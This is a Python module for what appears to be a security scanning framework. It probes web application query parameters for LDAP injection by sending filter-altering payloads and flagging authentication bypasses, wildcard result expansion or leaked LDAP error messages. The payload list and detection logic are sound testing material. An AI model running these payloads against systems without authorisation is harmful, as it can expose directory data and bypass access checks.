"""
ldap_inj.py — LDAP injection probe (OWASP A03 Injection).

Applications that build an LDAP filter from user input (login filters,
user lookups, search boxes hitting 389/3268) accept filter-syntax injection:
payloads that alter the filter's boolean structure (`*)(uid=*))(|(uid=*`,
`*`, unbalanced parens). This tool compares a baseline filter request against
injected variants and flags behavior differences — an access check that turns
into a wildcard result, or an LDAP filter error string leaking the query.

Pure python + requests; GET with an injected query param only (a read). No
LDAP connection is opened directly — this targets the app's HTTP layer the
LDAP search is wired through (the same layer a remote attacker hits).

Heuristic (shared with nosql_inj / waf_bypass): anomalies → candidate findings
to verify, not auto-claims.
"""

from __future__ import annotations

from typing import Any, Dict, List, Optional
from urllib.parse import urlencode, urlparse, urlunparse

from tools.base import Tool, ToolResult

DEFAULT_TIMEOUT = 8
_PAYLOADS = [
    "*)",
    "*)(uid=*))(|(uid=*",
    "*)(|(objectClass=*))",
    ")(&(|",
    "*",          # wildcard expansion
    "\\00",       # null-byte filter behavior
    "x)(uid=*)",
]
_LDAP_ERROR_HINTS = ("malformed filter", "ldap error", "search filter",
                     "invalid dn", "filter:", "result code 87", "invalid search")
_BODY_DELTA = 60  # bytes


class LDAPInjectionTool(Tool):
    name = "ldap_inj"
    capability = "LDAP_INJECTION_SCAN"
    binary = ""  # python + requests

    def is_available(self) -> bool:
        return True

    def validate(self) -> Optional[str]:
        return None

    def build_command(self, target: str, **kwargs) -> List[str]:
        return []

    def parse(self, stdout: str, stderr: str) -> Dict[str, Any]:
        return {}

    def run(self, target: str, timeout: int = DEFAULT_TIMEOUT, **kwargs) -> ToolResult:
        try:
            import requests
        except ImportError as exc:
            return ToolResult(tool=self.name, status="error", capability=self.capability,
                              error=f"'requests' package not available: {exc}")

        urls = kwargs.get("urls") or [target]
        param = kwargs.get("param")
        results: List[Dict[str, Any]] = []
        tested = 0

        for url in urls[:20]:
            base = str(url)
            params = self._query_params(base)
            if not params:
                continue
            names = [param] if param else [k for k, _ in params]
            baseline = self._get(requests, base, timeout)
            if baseline is None:
                continue
            for name in names:
                for payload in _PAYLOADS:
                    injected = self._inject(base, name, payload)
                    resp = self._get(requests, injected, timeout)
                    tested += 1
                    if resp is None:
                        continue
                    if self._is_anomaly(baseline, resp, payload):
                        results.append({
                            "url": injected, "param": name, "payload": payload,
                            "baseline_status": baseline[0], "injected_status": resp[0],
                            "len_delta": abs(len(resp[1]) - len(baseline[1]))})
                        break  # one hit per param is enough

        if not results:
            return ToolResult(tool=self.name, status="success", capability=self.capability,
                              results={"tested": tested, "ldap_results": [],
                                       "vulnerable": [], "note": "no LDAP filter anomaly observed"})

        out: Dict[str, Any] = {"tested": tested, "ldap_results": results,
                               "vulnerable": results}
        out["vulnerabilities"] = [
            {"name": "LDAP injection — filter syntax anomaly",
             "severity": "HIGH", "url": r["url"], "kind": "ldap_injection"}
            for r in results]
        return ToolResult(tool=self.name, status="success", capability=self.capability,
                          results=out)

    # ── internals ───────────────────────────────────────────────────────

    @staticmethod
    def _query_params(url: str) -> List[tuple]:
        from urllib.parse import parse_qsl
        return parse_qsl(url.split("?", 1)[1] if "?" in url else "", keep_blank_values=True)

    @staticmethod
    def _inject(url: str, name: str, payload: str) -> str:
        parsed = urlparse(url)
        params = []
        for k, v in LDAPInjectionTool._query_params(url):
            params.append((k, payload if k == name else v))
        return urlunparse(parsed._replace(query=urlencode(params)))

    def _get(self, requests, url: str, timeout: int):
        try:
            r = requests.get(url, headers={"User-Agent": "Mozilla/5.0 CyberSwarm-ldapi/1.0"},
                             timeout=timeout, allow_redirects=False, verify=True)
            return r.status_code, r.text[:6000]
        except Exception:  # noqa: BLE001
            return None

    @staticmethod
    def _is_anomaly(baseline, injected, payload: str) -> bool:
        b_status, b_body = baseline
        i_status, i_body = injected
        if b_status in (401, 403, 404) and i_status in (200, 201, 202):
            return True  # injection widened the filter -> bypass
        if payload == "*" and b_status == i_status and abs(len(i_body) - len(b_body)) > _BODY_DELTA:
            return True  # wildcard expanded the result set
        err = any(h in (i_body or "").lower() for h in _LDAP_ERROR_HINTS)
        return err and i_status in (400, 500, 422)